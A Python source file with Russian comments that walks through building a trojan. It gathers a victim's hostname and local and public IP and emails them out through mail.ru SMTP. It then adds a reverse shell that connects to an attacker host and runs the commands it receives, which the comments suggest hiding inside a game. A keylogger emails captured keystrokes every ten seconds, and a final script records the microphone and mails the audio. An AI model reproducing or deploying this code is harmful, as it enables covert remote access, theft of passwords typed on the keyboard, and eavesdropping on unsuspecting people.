# Определяем ip

# Сначала трояну нужно определиться, где он оказался.

# Импортирую нужные библиотеки
import os
import socket

import keyboard
from requests import get

# Далее идет код получения внешнего и внутреннего адресов.
# Стоит обраттить внимание, что если жертвы несколько сетевых интерфейсов(Wi-Fi и Ethernet одновременно)
# код может вести себя неправильно.(В моем случае, код неверно определял lan устровства подключенного по Wi-Fi)

# Определяю имя устройства
hostname = socket.gethostname()

# Определяю локальный адрес
local_ip = socket.gethostbyname(hostname)

# Определяю глобальный(публичный) адрес
public_ip = get('http://api.ipify.org').text

# Если с локалкой более менее просто - находим имя устройства
# в сети и смотрим IP по имени устройства, то вот с публичным IP
# все немного сложнее.

# Я выбрал сайт api.ipify.org, т.к. он возвращает внешний ip строкой.
# Затем из связки публичный + локальный IP мы получим почти точный адрес устройства.

# Вывод информацию еще проще
print(f'Хост: {hostname}')
print(f'Локальный IP: {local_ip}')
print(f'Публичный IP: {public_ip}')

# Запустив этот скрипт, мы сможем определить IP-адрес нашего(или чужого)
# компьютера

# Бэкконенкт по почте(Надо будет сделать с ботом в телеге)

# Теперь напишу скрипт, который будет отправлять мне письмо с информацией
# Импорт новых библиотек
import smtplib as smtp
from getpass import getpass

# Пишу базовую информацию о себе

# Почта с которой будет отправлено письмо

email = ''

# Пароль от нее

password = ''

# Почта, на которую отправляется письмо

dest_email = ''

# Тема письма
subject = 'IP'

# Текст письма
email_text = ''

# Формирование письма
message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)

#На последок настраиваю подключение к почтовому сервису

server = smtp.SMTP_SSL('') #SMTP-сервер (Google, Yandex, Mail и т.п)
server.set_debuglevel(1) # Минимизация вывода ошибок(только фатальные)
server.ehlo(email) # Отправка ехо пакетов на сервер
server.login(email, password) # Вход на акканут с которого будет отправлено письмо
server.auth_plain() # Авторизация
server.sendmail(email, dest_email, message) # Данные для отправки
server.quit() # Отключение от сервера

# Объединяю первый и второй скрипт

import smtplib as smtp
import socket

from requests import get

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text

# Как по мне, для подобной эксплуатации, сервис Mail оказался самым удобным и дружелюбным с пользователем,
# есть даже подробная инструкция https://help.mail.ru/mail/mailer/popsmtp по которой производилась настройка.

email = '@mail.ru'
password_dist_ap = ''
dest_email = '@mail.ru'

subject = 'IP'
email_text = f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}'
message = f'From: {email}\nTo: {dest_email}\nSubject: {subject}\n\n{email_text}'.encode()

server = smtp.SMTP_SSL('smtp.mail.ru', 465)
server.login(email, password_dist_ap)
server.sendmail(email, dest_email, message)
server.quit()


# Троян


# По задумке, главной функцией будет функция представляющая собой клиент-серверное приложение с клиентом на
# машине атакуемого и сервером на запускающей машине, для реализации удаленного доступа к машине



import socket
import subprocess


def trojan():
    # IP-адресс атакующего | Для роботы в сети WAN нужно настроить на маршрутизаторе атакующего перенаправление портов
    HOST = '' # хост WAN
    # Порт по которому производится подключение
    PORT = 9090
    # Устанавливаю соединение (запрос-ответ)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET определяет IPv4, SOCK_STREAM устанавливает TCP подключение
    client.connect((HOST, PORT))

    while True:
        # Принятие команд с сервера
        server_command = client.recv(1024).decode()

        if server_command == 'exit':
            break
        output = subprocess.getoutput(server_command)
        client.send(output.encode())
    client.close()
# Данныую функцию можно встроить например в код игры
trojan()





# Клавиатурный стиллер


from pynput import keyboard
import requests
import smtplib as smtp
import socket
import threading

# Создаю глобальную переменную для сохранения нажатых клавиш
text = ""


# Интервал на отправку сообщений
time_interval = 10

def send_post_req():
    try:
        email = '@mail.ru'
        password_dist_ap = ''
        dest_email = '@mail.ru'

        subject = 'IP'

        message = f'From: {email}\nTo: {dest_email}\nSubject: {subject}\n\n{text}'.encode()

        server = smtp.SMTP_SSL('smtp.mail.ru', 465)
        server.login(email, password_dist_ap)
        server.sendmail(email, dest_email, message)
        server.quit()

        timer = threading.Timer(time_interval, send_post_req)
        # отпрака сообщении отсчет таймера
        timer.start()
    except:
        print("Couldn't complete request!")

# Принимаем нажатия
def on_press(key):
    global text

# Подробнее
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # Явно преобразовываем объект нажатия в строку и добавляем в память
        text += str(key).strip("'")

# Вызываю прослушивание клавиатуры и отправляю данные нажатий на обработку в функцию on_press
# использую удобную конструкцию with as для гарантии выполнения даже если на вход ничего не подается.
with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()




# Запись микрофона и отправка по почте

# Подготовка и отпрака сообщения

import smtplib as smtp
from email.mime.multipart import MIMEMultipart
from email.mime.audio import MIMEAudio

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = '@mail.ru'
password_dist_ap = ''

def prepare_mail():

    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "Voice"


    file = open('recorded.wav', 'rb')
    audio = MIMEAudio(file.read())
    file.close()
    audio.add_header('Content-Disposition', 'attachment', filename='recorded.wav')
    msg.attach(audio)
    return msg.as_string()

def sendmail(email, password):
    server = smtp.SMTP_SSL('smtp.mail.ru', 465)
    server.login(email, password)
    server.sendmail(email, email, prepare_mail())
    server.quit()

sendmail(EMAIL_ADDRESS, password_dist_ap)

# Создание аудио

import pyaudio
import wave


filename = "recorded.wav"

# Устанавливаю кол-во кадров в буфере, сигнал будет разбиваться на "отрезки" соответствующего размера
chunk = 1024

FORMAT = pyaudio.paInt16
# Моно
channels = 1
# Частота кадров в секунду
sample_rate = 44100
record_seconds = 60

p = pyaudio.PyAudio()
# Поток вывода и ввода
stream = p.open(format=FORMAT,
                channels=channels,
                rate=sample_rate,
                input=True,
                output=True,
                frames_per_buffer=chunk)
frames = []
print("Запись стартанула")
for i in range(int(sample_rate / chunk * record_seconds)):
    data = stream.read(chunk)
    # Есть хочется слушать свой голос, есть следующая функция
    # stream.write(data)
    frames.append(data)
print("Завершение записи")
# Завершение потока
stream.stop_stream()
stream.close()
# Уничтожение объекта
p.terminate()
# Сохранение файла
wf = wave.open(filename, "wb")
wf.setnchannels(channels)
wf.setsampwidth(p.get_sample_size(FORMAT))
wf.setframerate(sample_rate)
wf.writeframes(b"".join(frames))
wf.close()

